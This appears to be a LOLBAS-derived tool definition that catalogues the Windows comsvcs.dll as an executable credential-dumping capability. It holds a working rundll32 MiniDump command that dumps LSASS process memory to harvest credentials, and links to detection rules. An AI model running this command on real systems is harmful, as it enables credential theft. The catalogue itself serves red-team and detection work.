---
id: windows-credential-comsvcs
namespace: windows:credential:comsvcs
name: comsvcs
description: 'COM+ Services Located at: c:\windows\system32\comsvcs.dll.'
author: LOLBAS Team
version: 1.0.0
capabilities:
- credential.dump
platforms:
- windows
risk_level: critical
trust_level: community
execution_policy: enabled
architectures:
- amd64
dependencies: []
related_tools: []
artifacts: []
workflow_edges:
  produces:
  - command-output
  consumes: []
contract:
  inputs: []
  outputs:
  - type: process.output
    description: Command execution output
  side_effects:
  - process_spawn
  resource_cost:
    cpu: low
    memory_mb: 16
    network: low
    disk_io: low
resource_profile:
  cpu: low
  memory_mb: 16
  network: low
  disk_io: low
allowed-tools:
- comsvcs
parameters: []
features:
- pipes-stdout
- process-manip
execution:
  template: comsvcs
  sandbox: execFile
  timeout_seconds: 30
  shell: false
global_vars: {}
examples:
- description: Calls the MiniDump exported function of comsvcs.dll, which in turns
    calls MiniDumpWriteDump. (Dump Lsass.exe process memory to retrieve credentials.)
  command: rundll32 C:\windows\system32\comsvcs.dll MiniDump {LSASS_PID} dump.bin
    full
references:
- label: ''
  url: https://modexp.wordpress.com/2019/08/30/minidumpwritedump-via-com-services-dll/
techniques:
- credential-access
mitre_ids:
- T1003.001
detections:
- type: sigma
  url: https://github.com/SigmaHQ/sigma/blob/c04bef2fbbe8beff6c7620d5d7ea6872dbe7acba/rules/windows/process_creation/proc_creation_win_rundll32_process_dump_via_comsvcs.yml
- type: sigma
  url: https://github.com/SigmaHQ/sigma/blob/683b63f8184b93c9564c4310d10c571cbe367e1e/rules/windows/process_access/proc_access_win_lsass_dump_comsvcs_dll.yml
- type: elastic
  url: https://github.com/elastic/detection-rules/blob/5bdf70e72c6cd4547624c521108189af994af449/rules/windows/credential_access_cmdline_dump_tool.toml
- type: splunk
  url: https://github.com/splunk/security_content/blob/86a5b644a44240f01274c8b74d19a435c7dae66e/detections/endpoint/dump_lsass_via_comsvcs_dll.yml
install:
- method: choco
  package_name: comsvcs
  commands:
  - choco install comsvcs
---

# comsvcs

comsvcs is a Windows LOLBin. COM+ Services Located at: c:\windows\system32\comsvcs.dll.
